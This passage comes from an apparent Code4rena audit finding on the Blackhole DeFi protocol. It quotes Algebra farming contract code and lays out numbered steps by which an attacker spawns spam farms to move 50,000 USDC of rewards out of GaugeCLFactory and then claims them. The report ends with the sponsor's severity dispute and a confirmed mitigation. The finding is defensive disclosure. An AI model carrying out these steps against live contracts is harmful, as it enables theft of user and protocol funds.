<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IncentiveParams</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">params</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">plugin</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">onlyIncentiveMaker</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">virtualPool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">connectedPlugin</span><span class="mtk1"> = </span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">pool</span><span class="mtk1">.</span><span class="mtk11">plugin</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">connectedPlugin</span><span class="mtk1"> != </span><span class="mtk12">plugin</span><span class="mtk1"> || </span><span class="mtk12">connectedPlugin</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">pluginNotConnected</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">IFarmingPlugin</span><span class="mtk1">(</span><span class="mtk12">connectedPlugin</span><span class="mtk1">).</span><span class="mtk11">incentive</span><span class="mtk1">() != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">anotherFarmingIsActive</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">virtualPool</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">EternalVirtualPool</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">connectedPlugin</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IFarmingCenter</span><span class="mtk1">(</span><span class="mtk12">farmingCenter</span><span class="mtk1">).</span><span class="mtk11">connectVirtualPoolToPlugin</span><span class="mtk1">(</span><span class="mtk12">virtualPool</span><span class="mtk1">, </span><span class="mtk11">IFarmingPlugin</span><span class="mtk1">(</span><span class="mtk12">connectedPlugin</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">nonce</span><span class="mtk1"> = </span><span class="mtk12">numOfIncentives</span><span class="mtk1">++;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">incentiveKeys</span><span class="mtk1">[</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">pool</span><span class="mtk1">)] = </span><span class="mtk12">key</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">incentiveId</span><span class="mtk1"> = </span><span class="mtk12">IncentiveId</span><span class="mtk1">.</span><span class="mtk11">compute</span><span class="mtk1">(</span><span class="mtk12">key</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">Incentive</span><span class="mtk1"> </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">newIncentive</span><span class="mtk1"> = </span><span class="mtk12">incentives</span><span class="mtk1">[</span><span class="mtk12">incentiveId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    (</span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">reward</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">bonusReward</span><span class="mtk1">) = </span><span class="mtk11">_receiveRewards</span><span class="mtk1">(</span><span class="mtk12">key</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">reward</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">bonusReward</span><span class="mtk1">, </span><span class="mtk12">newIncentive</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">reward</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">zeroRewardAmount</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">unchecked</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">int256</span><span class="mtk1">(</span><span class="mtk11">uint256</span><span class="mtk1">(</span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">minimalPositionWidth</span><span class="mtk1">)) &gt; (</span><span class="mtk11">int256</span><span class="mtk1">(</span><span class="mtk12">TickMath</span><span class="mtk1">.</span><span class="mtk12">MAX_TICK</span><span class="mtk1">) - </span><span class="mtk11">int256</span><span class="mtk1">(</span><span class="mtk12">TickMath</span><span class="mtk1">.</span><span class="mtk12">MIN_TICK</span><span class="mtk1">)))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">minimalPositionWidthTooWide</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">newIncentive</span><span class="mtk1">.</span><span class="mtk12">virtualPoolAddress</span><span class="mtk1"> = </span><span class="mtk12">virtualPool</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">newIncentive</span><span class="mtk1">.</span><span class="mtk12">minimalPositionWidth</span><span class="mtk1"> = </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">minimalPositionWidth</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">newIncentive</span><span class="mtk1">.</span><span class="mtk12">pluginAddress</span><span class="mtk1"> = </span><span class="mtk12">connectedPlugin</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">EternalFarmingCreated</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">rewardToken</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">bonusRewardToken</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">pool</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">virtualPool</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">nonce</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">reward</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">bonusReward</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">minimalPositionWidth</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">_addRewards</span><span class="mtk1">(</span><span class="mtk11">IAlgebraEternalVirtualPool</span><span class="mtk1">(</span><span class="mtk12">virtualPool</span><span class="mtk1">), </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">reward</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">bonusReward</span><span class="mtk1">, </span><span class="mtk12">incentiveId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">_setRewardRates</span><span class="mtk1">(</span><span class="mtk11">IAlgebraEternalVirtualPool</span><span class="mtk1">(</span><span class="mtk12">virtualPool</span><span class="mtk1">), </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">rewardRate</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">bonusRewardRate</span><span class="mtk1">, </span><span class="mtk12">incentiveId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }</span></span></span></code></pre>
<ol start="6">
<li>It calls the <code>_receiveRewards</code> function <a href="https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L411">here</a>:</li>
</ol>
<pre data-index="8" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_receiveRewards</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IncentiveKey</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">key</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">bonusReward</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">Incentive</span><span class="mtk1"> </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">incentive</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  ) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">receivedReward</span><span class="mtk1">, </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">receivedBonusReward</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (!</span><span class="mtk12">unlocked</span><span class="mtk1">) </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">reentrancyLock</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">unlocked</span><span class="mtk1"> = </span><span class="mtk4">false</span><span class="mtk1">; </span><span class="mtk3">// reentrancy lock</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">reward</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) </span><span class="mtk12">receivedReward</span><span class="mtk1"> = </span><span class="mtk11">_receiveToken</span><span class="mtk1">(</span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">rewardToken</span><span class="mtk1">, </span><span class="mtk12">reward</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">bonusReward</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) </span><span class="mtk12">receivedBonusReward</span><span class="mtk1"> = </span><span class="mtk11">_receiveToken</span><span class="mtk1">(</span><span class="mtk12">key</span><span class="mtk1">.</span><span class="mtk12">bonusRewardToken</span><span class="mtk1">, </span><span class="mtk12">bonusReward</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">unlocked</span><span class="mtk1"> = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    (</span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">_totalRewardBefore</span><span class="mtk1">, </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">_bonusRewardBefore</span><span class="mtk1">) = (</span><span class="mtk12">incentive</span><span class="mtk1">.</span><span class="mtk12">totalReward</span><span class="mtk1">, </span><span class="mtk12">incentive</span><span class="mtk1">.</span><span class="mtk12">bonusReward</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">incentive</span><span class="mtk1">.</span><span class="mtk12">totalReward</span><span class="mtk1"> = </span><span class="mtk12">_totalRewardBefore</span><span class="mtk1"> + </span><span class="mtk12">receivedReward</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">incentive</span><span class="mtk1">.</span><span class="mtk12">bonusReward</span><span class="mtk1"> = </span><span class="mtk12">_bonusRewardBefore</span><span class="mtk1"> + </span><span class="mtk12">receivedBonusReward</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }</span></span></span></code></pre>
<ol start="7">
<li>It calls the <code>_receiveToken</code> function <a href="https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L428">here</a>: </li>
</ol>
<pre data-index="9" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_receiveToken</span><span class="mtk1">(</span><span class="mtk12">IERC20Minimal</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">uint128</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">private</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint128</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">balanceBefore</span><span class="mtk1"> = </span><span class="mtk11">_getBalanceOf</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">TransferHelper</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">), </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">balanceAfter</span><span class="mtk1"> = </span><span class="mtk11">_getBalanceOf</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">balanceAfter</span><span class="mtk1"> &gt; </span><span class="mtk12">balanceBefore</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">unchecked</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">received</span><span class="mtk1"> = </span><span class="mtk12">balanceAfter</span><span class="mtk1"> - </span><span class="mtk12">balanceBefore</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">received</span><span class="mtk1"> &gt; </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint128</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">) </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">invalidTokenAmount</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk11">uint128</span><span class="mtk1">(</span><span class="mtk12">received</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }</span></span></span></code></pre>
<ol start="8">
<li><code>1e10</code> (10,000) USDC has been transferred to the new algebra farm.</li>
<li>Attacker repeats step 2 to 6 for 5 times to fully transfer 50,000 USDC out of the <code>GaugeCLFactory</code> contract.</li>
<li>Attacker stakes relevant LP NFT into the spam gauges through the <code>GaugeCL.deposit</code> function:</li>
</ol>
<pre data-index="10" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">deposit</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">tokenId</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">isNotEmergency</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">nonfungiblePositionManager</span><span class="mtk1">.</span><span class="mtk11">ownerOf</span><span class="mtk1">(</span><span class="mtk12">tokenId</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">nonfungiblePositionManager</span><span class="mtk1">.</span><span class="mtk11">approveForFarming</span><span class="mtk1">(</span><span class="mtk12">tokenId</span><span class="mtk1">, </span><span class="mtk4">true</span><span class="mtk1">, </span><span class="mtk12">farmingParam</span><span class="mtk1">.</span><span class="mtk12">farmingCenter</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span><span class="mtk12">IERC20Minimal</span><span class="mtk1"> </span><span class="mtk12">rewardTokenAdd</span><span class="mtk1">, </span><span class="mtk12">IERC20Minimal</span><span class="mtk1"> </span><span class="mtk12">bonusRewardTokenAdd</span><span class="mtk1">, </span><span class="mtk12">IAlgebraPool</span><span class="mtk1"> </span><span class="mtk12">pool</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">nonce</span><span class="mtk1">) = </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">algebraEternalFarming</span><span class="mtk1">.</span><span class="mtk11">incentiveKeys</span><span class="mtk1">(</span><span class="mtk12">poolAddress</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IncentiveKey</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">incentivekey</span><span class="mtk1"> = </span><span class="mtk11">IncentiveKey</span><span class="mtk1">(</span><span class="mtk12">rewardTokenAdd</span><span class="mtk1">, </span><span class="mtk12">bonusRewardTokenAdd</span><span class="mtk1">, </span><span class="mtk12">pool</span><span class="mtk1">, </span><span class="mtk12">nonce</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">farmingCenter</span><span class="mtk1">.</span><span class="mtk11">enterFarming</span><span class="mtk1">(</span><span class="mtk12">incentivekey</span><span class="mtk1">, </span><span class="mtk12">tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Deposit</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">tokenId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ol start="11">
<li>Attacker directly calls the <code>AlgebraEternalFarming.claimReward</code> function to claim the rewards <a href="https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/FarmingCenter.sol#L119">here</a>:</li>
</ol>
<pre data-index="11" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk3">/// @inheritdoc IAlgebraEternalFarming</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">claimReward</span><span class="mtk1">(</span><span class="mtk12">IERC20Minimal</span><span class="mtk1"> </span><span class="mtk12">rewardToken</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountRequested</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk11">_claimReward</span><span class="mtk1">(</span><span class="mtk12">rewardToken</span><span class="mtk1">, </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amountRequested</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_claimReward</span><span class="mtk1">(</span><span class="mtk12">IERC20Minimal</span><span class="mtk1"> </span><span class="mtk12">rewardToken</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountRequested</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">reward</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">to</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">claimToZeroAddress</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">mapping</span><span class="mtk1">(</span><span class="mtk12">IERC20Minimal</span><span class="mtk1"> </span><span class="mtk4">=&gt;</span><span class="mtk1"> </span><span class="mtk12">uint256</span><span class="mtk1">) </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">userRewards</span><span class="mtk1"> = </span><span class="mtk12">rewards</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">reward</span><span class="mtk1"> = </span><span class="mtk12">userRewards</span><span class="mtk1">[</span><span class="mtk12">rewardToken</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amountRequested</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1"> || </span><span class="mtk12">amountRequested</span><span class="mtk1"> &gt; </span><span class="mtk12">reward</span><span class="mtk1">) </span><span class="mtk12">amountRequested</span><span class="mtk1"> = </span><span class="mtk12">reward</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amountRequested</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">unchecked</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">userRewards</span><span class="mtk1">[</span><span class="mtk12">rewardToken</span><span class="mtk1">] = </span><span class="mtk12">reward</span><span class="mtk1"> - </span><span class="mtk12">amountRequested</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">TransferHelper</span><span class="mtk1">.</span><span class="mtk11">safeTransfer</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardToken</span><span class="mtk1">), </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amountRequested</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">RewardClaimed</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amountRequested</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardToken</span><span class="mtk1">), </span><span class="mtk12">from</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }</span></span></span></code></pre>
<p><strong>Blackhole commented:</strong></p>
<blockquote>
<p>Blackhole Protocol disputes the classification of this issue as high severity, noting that the protocol is designed to deposit no more than <code>$0.10</code> worth of BLACK tokens, an amount sufficient to spawn over a million liquidity pools on Blackhole.</p>
</blockquote>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-6">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-53">rayss</a>.</p>
<hr>
